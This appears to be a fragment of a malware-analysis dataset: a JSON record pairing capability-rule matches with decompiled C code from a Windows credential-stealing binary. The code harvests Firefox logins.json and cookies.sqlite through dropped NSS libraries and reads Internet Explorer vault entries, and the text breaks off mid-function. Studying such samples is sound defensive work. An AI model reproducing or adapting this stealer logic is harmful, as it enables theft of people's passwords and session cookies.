&&\n                   (iVar3 = (**(var_10h + 0x98))(),  iVar3 == 0)) {\n                    lpExistingFileName = 0;\n                    if (iVar2 != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                        lpExistingFileName = fcn.00406f2c();\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n                    }\n                    fcn.004043fa(L\"\\\\logins.json\");\n                    fcn.00413915();\n                    fcn.004043fa(0x4194e4);\n                    uVar7 = fcn.004044c4();\n                    fcn.004042c5(uVar7);\n                    fcn.00406f1d();\n                    var_48h = 0;\n                    fcn.004043fa(L\".tmp\");\n                    iVar2 = (*_sym.imp.KERNEL32.dll_CopyFileW)();\n                    if (iVar2 != 0) {\n                        fcn.004043c7(&lpNewFileName);\n                    }\n                    fcn.00413fc0();\n                    var_b8h = 0;\n                    if (lpExistingFileName != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                        var_b8h = fcn.00406e8d();\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n                    }\n                    iVar2 = fcn.00413f4f(0xc0000000);\n                    if (iVar2 != 0) {\n                        var_34h = 0;\n                        var_30h = 0;\n                        fcn.00413b7c(&var_34h, var_a8h, 0);\n                        fcn.0040434f(\"encryptedUsername\");\n                        fcn.00403f58(&var_74h);\n                        iVar2 = fcn.0040c354();\n                        var_18h = iVar2;\n                        fcn.00406f1d();\n                        fcn.00406f1d();\n                        while (iVar2 != 0) {\n                            var_6ch = 0;\n                            var_68h = 0;\n                            var_64h = 0;\n                            uVar7 = fcn.0040434f(\"hostname\");\n                            fcn.00403f58(&var_7ch);\n                            fcn.0040c38d(uVar7, var_18h);\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            uVar7 = fcn.0040434f(\"encryptedUsername\");\n                            fcn.00403f58(&var_84h);\n                            fcn.0040c38d(uVar7, var_18h);\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            uVar7 = fcn.0040434f(\"encryptedPassword\");\n                            fcn.00403f58(&var_8ch);\n                            fcn.0040c38d(uVar7, var_18h);\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            fcn.0040da6a(var_5ch, &var_38h);\n                            fcn.0040da6a(var_58h, &var_3ch);\n                            uVar7 = fcn.004040d5(&var_4ch);\n                            fcn.004043c7(uVar7);\n                            fcn.00406f1d();\n                            var_4ch = 0;\n                            pcVar6 = var_38h;\n                            do {\n                                cVar1 = *pcVar6;\n                                pcVar6 = pcVar6 + 1;\n                            } while (cVar1 != '\\0');\n                            if (pcVar6 != var_38h + 1) {\n                                fcn.0040434f(var_38h);\n                                uVar7 = fcn.004040d5(&var_50h);\n                                fcn.004043c7(uVar7);\n                                fcn.00406f1d();\n                                var_50h = 0;\n                                fcn.00406f1d();\n                            }\n                            pcVar6 = var_3ch;\n                            do {\n                                cVar1 = *pcVar6;\n                                pcVar6 = pcVar6 + 1;\n                            } while (cVar1 != '\\0');\n                            if (pcVar6 != var_3ch + 1) {\n                                fcn.0040434f(var_3ch);\n                                uVar7 = fcn.004040d5(&var_54h);\n                                fcn.004043c7(uVar7);\n                                fcn.00406f1d();\n                                var_54h = 0;\n                                fcn.00406f1d();\n                            }\n                            var_60h = 0;\n                            puVar8 = &var_6ch;\n                            fcn.00402790(puVar8);\n                            fcn.0040283b(puVar8);\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            iVar2 = var_18h + -1;\n                            var_18h = iVar2;\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            fcn.00406f1d();\n                            fcn.004015d4();\n                        }\n                        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n                        if (iVar2 != 0) {\n                            var_24h = &stack0xfffffaf0;\n                            uVar7 = 0;\n                            puVar8 = &stack0xfffffaf0;\n                            if (lpNewFileName != 0) {\n                                (*_sym.imp.KERNEL32.dll_lstrlenW)(lpNewFileName);\n                                uVar4 = fcn.00406f2c();\n                                iVar2 = lpNewFileName;\n                                *var_24h = uVar4;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar4, iVar2);\n                                puVar8 = var_24h;\n                            }\n                            var_24h = puVar8;\n                            fcn.00413c34(uVar7);\n                        }\n                        (**(var_10h + 0xa0))();\n                        (**(var_10h + 0x88))();\n                        if (var_34h != 0) {\n                            fcn.00406f66();\n                        }\n                        var_34h = 0;\n                    }\n                    fcn.00413c16();\n                    fcn.00406f1d();\n                    lpNewFileName = 0;\n                    fcn.00406f1d();\n                }\n                fcn.00406f1d();\n                fcn.00406f1d();\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)();\n                iVar2 = var_a0h;\n            }\n            fcn.0040e2da();\n            uVar7 = 1;\n            fcn.00406f1d();\n        }\n        fcn.00406f1d();\n    }\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return uVar7;\n}\n",
        "token_count": 2790
    },
    "0040db12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __fastcall fcn.0040db12(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint uStack88;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_ch = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_50h = 0;\n    iVar1 = fcn.0040de78();\n    if ((((iVar1 != 0) && (iVar1 = (**(param_1 + 0xa8))(0x41e140, 0, &var_ch),  iVar1 == 0)) &&\n        (iVar1 = (**(param_1 + 0xb0))(var_ch, 0x200, &var_28h, &var_10h),  iVar1 == 0)) && (var_28h != 0)) {\n        var_4ch = 0;\n        var_24h = 0;\n        var_20h = 0;\n        do {\n            iVar1 = fcn.0040de44();\n            iVar3 = 0;\n            if (iVar1 == 0) {\n                var_18h = var_24h + var_10h;\n                do {\n                    if (*(iVar4 + iVar3 * 4) != *(iVar3 * 4 + 0x41e130)) goto code_r0x0040dde4;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 != 4);\n                fcn.0040460a(*(var_18h + 0x10));\n                uVar2 = fcn.0040460a(L\"Internet Explorer\");\n                iVar1 = fcn.00404276(uVar2);\n                fcn.00406f1d();\n                iVar4 = var_4h;\n                var_3ch = 0;\n                if (iVar1 != 0) {\n                    var_60h = *0x41c9f0;\n                    var_5ch = *0x41c9f4;\n                    var_58h = *0x41c9f8;\n                    uStack88 = *0x41c9fc;\n                    uVar2 = fcn.0040460a(*(var_4h + 0x14) + 0x20);\n                    fcn.004043c7(uVar2);\n                    fcn.00406f1d();\n                    var_40h = 0;\n                    uVar2 = fcn.0040460a(*(iVar4 + 0x18) + 0x20);\n                    fcn.004043c7(uVar2);\n                    fcn.00406f1d();\n                    var_8h = 0;\n                    var_44h = 0;\n                    iVar4 = (**(param_1 + 0xb4))\n                                      (var_ch, var_18h, *(var_18h + 0x14), *(var_18h + 0x18), 0, 0, 0, &var_8h);\n                    if (iVar4 == 0) {\n                        var_4h = var_8h;\n                        var_60h = *(var_18h + 0x1c) + 0x20;\n                        var_5ch = fcn.0040460a(var_60h);\n                        fcn.004043c7(var_5ch);\n                        fcn.00406f1d();\n                        var_48h = 0;\n                    }\n                    puVar5 = &var_60h;\n                    fcn.00402790(puVar5);\n                    fcn.0040283b(puVar5);\n                    fcn.004015d4();\n                }\n                fcn.00406f1d();\n                var_1ch = 0;\n                iVar4 = var_4h;\n            }\n            else {\n                var_4h = var_20h + var_10h;\n                do {\n                    iVar4 = var_4h;\n                    if (*(var_4h + iVar3 * 4) != *(iVar3 * 4 + 0x41e130)) goto code_r0x0040dde4;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 != 4);\n                fcn.0040460a(*(var_4h + 0x10));\n                uVar2 = fcn.0040460a(L\"Internet Explorer\");\n                iVar1 = fcn.00404276(uVar2);\n                fcn.00406f1d();\n                iVar4 = var_4h;\n                var_2ch = 0;\n                if (iVar1 != 0) {\n                    var_60h = *0x41c9f0;\n                    var_5ch = *0x41c9f4;\n                    var_58h = *0x41c9f8;\n                    uStack88 = *0x41c9fc;\n                    uVar2 = fcn.0040460a(*(var_4h + 0x14) + 0x20);\n                    fcn.004043c7(uVar2);\n                    fcn.00406f1d();\n                    var_30h = 0;\n                    uVar2 = fcn.0040460a(*(iVar4 + 0x18) + 0x20);\n                    fcn.004043c7(uVar2);\n                    fcn.00406f1d();\n                    var_8h = 0;\n                    var_34h = 0;\n                    iVar4 = (**(param_1 + 0xb4))(var_ch, iVar4, *(iVar4 + 0x14), *(iVar4 + 0x18), 0, 0, 0, &var_8h);\n                    if (iVar4 == 0) {\n                        var_4h = var_8h;\n                        var_60h = *(var_8h + 0x1c) + 0x20;\n                        var_5ch = fcn.0040460a(var_60h);\n                        fcn.004043c7(var_5ch);\n                        fcn.00406f1d();\n                        var_38h = 0;\n                    }\n                    puVar5 = &var_60h;\n                    fcn.00402790(puVar5);\n                    fcn.0040283b(puVar5);\n                    fcn.004015d4();\n                }\n                fcn.00406f1d();\n                var_14h = 0;\n                iVar4 = var_4h;\n            }\ncode_r0x0040dde4:\n            var_20h = var_20h + 0x38;\n            var_4ch = var_4ch + 1;\n            var_24h = var_24h + 0x34;\n        } while (var_4ch < var_28h);\n    }\n    if (var_10h != 0) {\n        (**(param_1 + 0xbc))(var_10h);\n    }\n    if (var_ch != 0) {\n        (**(param_1 + 0xac))(&var_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(param_1 + 0xdc));\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 1860
    },
    "0040e331": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040e331(int32_t arg_8h, int32_t lpString2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *arg_8h_00;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    char *pcVar6;\n    char *pcVar7;\n    uint lpBuffer;\n    uint var_c30h;\n    uint var_a30h;\n    uint var_830h;\n    uint var_630h;\n    uint var_430h;\n    uint lpPathName;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    char *var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    pcVar6 = NULL;\n    var_14h = in_ECX;\n    fcn.00401293(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    if ((lpString2 == 1) &&\n       (((((*(in_ECX + 0xd4) == 0 || (*(in_ECX + 200) == 0)) || (*(in_ECX + 0xcc) == 0)) ||\n         ((*(in_ECX + 0xd8) == 0 || (*(in_ECX + 0xc0) == 0)))) || (*(in_ECX + 0xd0) == 0)))) {\n        fcn.0041780e(&var_30h, *(*0x41e7b4 + 8), 5);\n        if (var_2ch == 0) {\n            fcn.00404081();\n            goto code_r0x0040eb7d;\n        }\n        fcn.00401293(&var_a30h, 0, 0x100);\n        fcn.00401293(&var_430h, 0, 0x100);\n        fcn.00401293(&var_830h, 0, 0x100);\n        fcn.00401293(&var_630h, 0, 0x100);\n        fcn.00401293(&var_c30h, 0, 0x100);\n        fcn.00401293(&lpPathName, 0, 0x100);\n        var_ch = fcn.00401000(0x519d0);\n        var_8h = fcn.00401000(0x217d0);\n        arg_8h_00 = fcn.00401000(0x6b738);\n        pcVar6 = fcn.00401000(0x1303d0);\n        var_18h = pcVar6;\n        var_10h = fcn.00401000(0x235d0);\n        var_4h = fcn.00401000(0x14748);\n        fcn.0040126d(var_ch, var_30h, 0x519d0);\n        fcn.0040126d(var_8h, var_30h + 0x519d0, 0x217d0);\n        fcn.0040126d(arg_8h_00, var_30h + 0x731a0, 0x6b738);\n        fcn.0040126d(pcVar6, var_30h + 0xde8d8, 0x1303d0);\n        fcn.0040126d(var_10h, var_30h + 0x20eca8, 0x235d0);\n        fcn.0040126d(var_4h, var_30h + 0x232278, 0x14748);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetTempPathW;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x100, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_SetDllDirectoryW)(&lpPathName);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"softokn3.dll\");\n        (*pcVar2)(0x100, &var_430h);\n        (*pcVar1)(&var_430h, L\"msvcp140.dll\");\n        (*pcVar2)(0x100, &var_830h);\n        (*pcVar1)(&var_830h, L\"mozglue.dll\");\n        (*pcVar2)(0x100, &var_630h);\n        (*pcVar1)(&var_630h, L\"vcruntime140.dll\");\n        (*pcVar2)(0x100, &var_c30h);\n        (*pcVar1)(&var_c30h, L\"freebl3.dll\");\n        (*pcVar2)(0x100, &var_a30h);\n        (*pcVar1)(&var_a30h, L\"nss3.dll\");\n        pcVar7 = var_ch;\n        pcVar6 = var_18h;\n        if (((var_10h != NULL) && (arg_8h_00 != NULL)) &&\n           ((var_8h != NULL && (((var_4h != NULL && (var_ch != NULL)) && (var_18h != NULL)))))) {\n            if ((*var_10h == 'M') && (var_10h[1] == 'Z')) {\n                fcn.00415d7c(0x235d0);\n            }\n            if ((*arg_8h_00 == 'M') && (arg_8h_00[1] == 'Z')) {\n                fcn.00415d7c(0x6b738);\n            }\n            if ((*var_8h == 'M') && (var_8h[1] == 'Z')) {\n                fcn.00415d7c(0x217d0);\n            }\n            if ((*var_4h == 'M') && (var_4h[1] == 'Z')) {\n                fcn.00415d7c(0x14748);\n            }\n            if ((*pcVar7 == 'M') && (pcVar7[1] == 'Z')) {\n                fcn.00415d7c(0x519d0);\n            }\n            if ((*pcVar6 == 'M') && (pcVar6[1] == 'Z')) {\n                fcn.00415d7c(0x1303d0);\n            }\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(&var_430h);\n        *(in_ECX + 200) = uVar4;\n        uVar4 = (*pcVar1)(&var_630h);\n        *(in_ECX + 0xd8) = uVar4;\n        uVar4 = (*pcVar1)(&var_830h);\n        *(in_ECX + 0xcc) = uVar4;\n        uVar4 = (*pcVar1)(&var_a30h);\n        *(in_ECX + 0xd0) = uVar4;\n        uVar4 = (*pcVar1)(&lpPathName);\n        *(in_ECX + 0xd4) = uVar4;\n        uVar4 = (*pcVar1)(&var_c30h);\n        *(in_ECX + 0xc0) = uVar4;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        fcn.00404081();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(arg_8h);\n        fcn.004043fa(0x4194e4);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        var_8h = NULL;\n        if (arg_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_8h);\n            var_8h = fcn.00406f2c();\n            (*pcVar1)(var_8h, arg_8h);\n        }\n        fcn.004043fa(L\"nss3.dll\");\n        var_ch = NULL;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_ch = fcn.00406f2c();\n            (*pcVar1)(var_ch, arg_8h);\n        }\n        fcn.004043fa(L\"msvcr120.dll\");\n        var_18h = NULL;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_18h = fcn.00406f2c();\n            (*pcVar1)(var_18h, arg_8h);\n        }\n        fcn.004043fa(L\"msvcp120.dll\");\n        var_4h = NULL;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_4h = fcn.00406f2c();\n            (*pcVar1)(var_4h, arg_8h);\n        }\n        fcn.004043fa(L\"mozglue.dll\");\n        var_10h = NULL;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_10h = fcn.00406f2c();\n            (*pcVar1)(var_10h, arg_8h);\n        }\n        fcn.004043fa(L\"softokn3.dll\");\n        var_2ch = 0;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_2ch = fcn.00406f2c();\n            (*pcVar1)(var_2ch, arg_8h);\n        }\n        fcn.004043fa(L\"vcruntime140.dll\");\n        var_28h = 0;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_28h = fcn.00406f2c();\n            (*pcVar1)(var_28h, arg_8h);\n        }\n        fcn.004043fa(L\"msvcp\");\n        var_24h = 0;\n        if (arg_8h != 0) {\n            (*pcVar2)(arg_8h);\n            var_24h = fcn.00406f2c();\n            (*pcVar1)(var_24h, arg_8h);\n        }\n        fcn.004043fa(L\"msvcr\");\n        iVar3 = var_28h;\n        var_20h = 0x5a;\n        var_1ch = 0x5a;\n        do {\n            lpString2 = 0;\n            if (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3);\n                lpString2 = fcn.00406f2c();\n                (*pcVar1)(lpString2, iVar3);\n            }\n            fcn.00404477(var_1ch);\n            fcn.004043fa(0x41abc4);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpString2);\n            if (iVar5 != 0) {\n                if (lpString2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                    pcVar6 = fcn.00406e8d();\n                    (*pcVar1)(pcVar6, lpString2);\n                }\n                fcn.00406f1d();\n                pcVar7 = pcVar6;\n                break;\n            }\n            var_1ch = var_1ch + 10;\n            fcn.00406f1d();\n            pcVar7 = var_18h;\n        } while (var_1ch != 0x96);\n        iVar3 = var_24h;\n        iVar5 = 0x5a;\n        do {\n            lpString2 = 0;\n            if (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3);\n                lpString2 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString2, iVar3);\n                iVar5 = var_20h;\n            }\n            fcn.00404477(iVar5);\n            fcn.004043fa(0x41abc4);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpString2);\n            if (iVar5 != 0) {\n                pcVar6 = NULL;\n                if (lpString2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                    pcVar6 = fcn.00406e8d();\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(pcVar6, lpString2);\n                }\n                fcn.00406f1d();\n                break;\n            }\n            var_20h = var_20h + 10;\n            fcn.00406f1d();\n            iVar5 = var_20h;\n            pcVar6 = var_ch;\n        } while (var_20h != 0x96);\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_2ch);\n        *(var_14h + 0xd8) = uVar4;\n        uVar4 = (*pcVar1)(pcVar6);\n        *(var_14h + 0xc4) = uVar4;\n        uVar4 = (*pcVar1)(pcVar7);\n        *(var_14h + 200) = uVar4;\n        uVar4 = (*pcVar1)(var_4h);\n        *(var_14h + 0xcc) = uVar4;\n        uVar4 = (*pcVar1)(var_8h);\n        *(var_14h + 0xd0) = uVar4;\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        in_ECX = var_14h;\n    }\n    if (*(in_ECX + 0xd0) == 0) {\n        pcVar6 = NULL;\n    }\n    else {\n        uVar4 = fcn.0041473a(*(in_ECX + 0xd0));\n        *(in_ECX + 0x84) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x9c) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x98) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x8c) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x90) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x94) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x88) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0xa0) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0xa4) = uVar4;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        pcVar6 = 0x1;\n    }\ncode_r0x0040eb7d:\n    fcn.00406f1d();\n    return pcVar6;\n}\n",
        "token_count": 3658
    },
    "0040eff2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.0040eff2(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    ulong uVar9;\n    ulong uVar10;\n    uint var_288h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lpAppName;\n    uint var_28h;\n    uint *var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint *lpWideCharStr;\n    uint var_4h;\n    \n    fcn.00413915();\n    fcn.004043fa(L\"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.00404656(&var_1ch);\n    fcn.004043fa(L\"profiles.ini\");\n    fcn.0040460a(L\"Profile\");\n    puVar8 = NULL;\n    fcn.00404477(0);\n    fcn.00401293(&var_288h, 0, 0x208);\n    (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(lpAppName, L\"Path\", 0, &var_288h, 0x104, var_30h);\n    fcn.00404656(&var_1ch);\n    fcn.004043fa(&var_288h);\n    fcn.00404422(\"\\\\cookies.sqlite\");\n    iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpWideCharStr);\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n    uVar10 = CONCAT44(var_50h, var_4ch);\n    puVar5 = puVar8;\n    if (iVar2 != 0) {\n        var_20h = *(param_1 + 0x40);\n        var_ch = 0;\n        if (lpWideCharStr != NULL) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n            var_10h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0x200, lpWideCharStr, uVar3, 0, 0, 0, 0);\n            uVar3 = fcn.00406f2c();\n            if (lpWideCharStr == NULL) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = (*pcVar1)(lpWideCharStr);\n            }\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpWideCharStr, uVar4, uVar3, var_10h, 0, 0);\n            uVar3 = fcn.0040434f(uVar3);\n            fcn.0040415d(uVar3);\n            fcn.00406f1d();\n            fcn.00406f1d();\n        }\n        puVar8 = (*var_20h)(var_ch, &var_28h);\n        fcn.00406f1d();\n        uVar10 = CONCAT44(var_50h, var_4ch);\n        if (puVar8 == NULL) {\n            iVar2 = (**(param_1 + 0x44))\n                              (var_28h, \"SELECT host, path, name, value, expiry, isHttpOnly, isSecure FROM moz_cookies\"\n                               , 0xffffffff, &var_4h, 0);\n            uVar10 = CONCAT44(var_50h, var_4ch);\n            puVar5 = puVar8;\n            if (iVar2 == 0) {\n                puVar5 = fcn.00406fa7();\n                iVar2 = 9999;\n                *0x41e6a8 = puVar8;\n                if (puVar5 != NULL) {\n                    *0x41e6a8 = puVar5 + 1;\n                    *puVar5 = 9999;\n                    puVar5 = *0x41e6a8;\n                    do {\n                        *puVar5 = 0;\n                        puVar5[1] = 0;\n                        puVar5[2] = 0;\n                        puVar5[3] = 0;\n                        iVar2 = iVar2 + -1;\n                        puVar5 = puVar5 + 10;\n                    } while (iVar2 != 0);\n                }\n                *0x41e6ac = puVar8;\n                iVar2 = (**(param_1 + 0x60))(var_4h);\n                uVar10 = CONCAT44(var_50h, var_4ch);\n                while (iVar2 == 100) {\n                    var_ch = 0;\n                    var_24h = puVar8;\n                    var_18h = puVar8;\n                    var_14h = puVar8;\n                    pcVar6 = (**(param_1 + 0x4c))(var_4h, 0);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    if (*pcVar6 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar6);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.0040415d(uVar3);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.00406f1d();\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                    }\n                    pcVar6 = (**(param_1 + 0x4c))(var_4h, 1);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    if (*pcVar6 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar6);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.0040415d(uVar3);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.00406f1d();\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                    }\n                    pcVar6 = (**(param_1 + 0x4c))(var_4h, 2);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    if (*pcVar6 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar6);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.0040415d(uVar3);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.00406f1d();\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        puVar8 = var_24h;\n                    }\n                    pcVar6 = (**(param_1 + 0x4c))(var_4h, 3);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    iVar2 = 0;\n                    if (*pcVar6 != '\\0') {\n                        uVar3 = fcn.0040434f(pcVar6);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.0040415d(uVar3);\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        fcn.00406f1d();\n                        var_50h = uVar10 >> 0x20;\n                        var_4ch = uVar10;\n                        iVar2 = var_ch;\n                    }\n                    uVar9 = (**(param_1 + 0x54))(var_4h, 4);\n                    var_50h = uVar10 >> 0x20;\n                    var_4ch = uVar10;\n                    var_54h = (**(param_1 + 0x50))(var_4h, 5);\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    var_58h = (**(param_1 + 0x50))(var_4h, 6);\n                    var_50h = uVar9 >> 0x20;\n                    var_4ch = uVar9;\n                    if (puVar8 == NULL) {\ncode_r0x0040f2ca:\n                        if (iVar2 != 0) {\n                            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar2);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            if (0 < iVar7) goto code_r0x0040f2e1;\n                        }\n                    }\n                    else {\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar8);\n                        var_50h = uVar9 >> 0x20;\n                        var_4ch = uVar9;\n                        if (iVar7 < 1) goto code_r0x0040f2ca;\ncode_r0x0040f2e1:\n                        _var_80h = ZEXT816(0);\n                        if (var_18h != NULL) {\n                            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_18h);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            if (0 < iVar7) {\n                                uVar3 = fcn.004040d5(&var_34h);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.004043c7(uVar3);\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                fcn.00406f1d();\n                                var_50h = uVar9 >> 0x20;\n                                var_4ch = uVar9;\n                                var_34h = 0;\n                            }\n                        }\n                        if (var_14h != NULL) {\n                            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_14h);\n                            var_50h = uVar9 >> 0x20;\n                            var_4ch = uVar9;\n                            if (0 < iVar7) {\n                                